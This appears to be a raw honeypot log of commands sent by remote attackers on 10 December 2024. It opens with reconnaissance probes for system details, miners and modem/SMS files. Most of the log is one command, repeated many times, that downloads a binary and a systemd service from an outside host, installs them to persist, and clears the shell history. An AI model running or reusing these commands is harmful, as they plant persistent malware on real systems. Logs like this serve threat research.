start
2024-12-10 18:59:04.874827 - ('115.141.25.219', 44318) - /ip cloud print
2024-12-10 18:59:06.526107 - ('115.141.25.219', 44318) - ifconfig
2024-12-10 18:59:07.884670 - ('115.141.25.219', 44318) - uname -a
2024-12-10 18:59:09.227710 - ('115.141.25.219', 44318) - cat /proc/cpuinfo
2024-12-10 18:59:10.570020 - ('115.141.25.219', 44318) - ps | grep '[Mm]iner'
2024-12-10 18:59:11.919624 - ('115.141.25.219', 44318) - ps -ef | grep '[Mm]iner'
2024-12-10 18:59:13.264432 - ('115.141.25.219', 44318) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 18:59:14.611420 - ('115.141.25.219', 44318) - echo Hi | cat -n
2024-12-10 19:44:26.917950 - ('45.148.10.203', 33762) - apt
2024-12-10 19:44:27.095679 - ('45.148.10.203', 33762) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:44:31.413579 - ('45.148.10.203', 48826) - apt
2024-12-10 19:44:31.601913 - ('45.148.10.203', 48826) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:44:35.920867 - ('45.148.10.203', 48854) - apt
2024-12-10 19:44:36.108564 - ('45.148.10.203', 48854) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:44:40.588693 - ('45.148.10.203', 46330) - apt
2024-12-10 19:44:40.910864 - ('45.148.10.203', 46330) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:44:45.740130 - ('45.148.10.203', 46346) - apt
2024-12-10 19:44:45.915114 - ('45.148.10.203', 46346) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:44:50.262532 - ('45.148.10.203', 56710) - apt
2024-12-10 19:44:50.649488 - ('45.148.10.203', 56710) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:44:55.072250 - ('45.148.10.203', 56714) - apt
2024-12-10 19:44:55.252059 - ('45.148.10.203', 56714) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:44:59.562090 - ('45.148.10.203', 38750) - apt
2024-12-10 19:44:59.742892 - ('45.148.10.203', 38750) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:04.576416 - ('45.148.10.203', 38762) - apt
2024-12-10 19:45:04.758307 - ('45.148.10.203', 38762) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:09.151280 - ('45.148.10.203', 45280) - apt
2024-12-10 19:45:09.332019 - ('45.148.10.203', 45280) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:13.637626 - ('45.148.10.203', 45306) - apt
2024-12-10 19:45:13.814917 - ('45.148.10.203', 45306) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:18.304804 - ('45.148.10.203', 54190) - apt
2024-12-10 19:45:18.483754 - ('45.148.10.203', 54190) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:22.795104 - ('45.148.10.203', 54192) - apt
2024-12-10 19:45:22.971151 - ('45.148.10.203', 54192) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:27.278235 - ('45.148.10.203', 54194) - apt
2024-12-10 19:45:27.718313 - ('45.148.10.203', 54194) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:32.760324 - ('45.148.10.203', 59364) - apt
2024-12-10 19:45:32.942857 - ('45.148.10.203', 59364) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 19:45:37.323162 - ('45.148.10.203', 59390) - apt
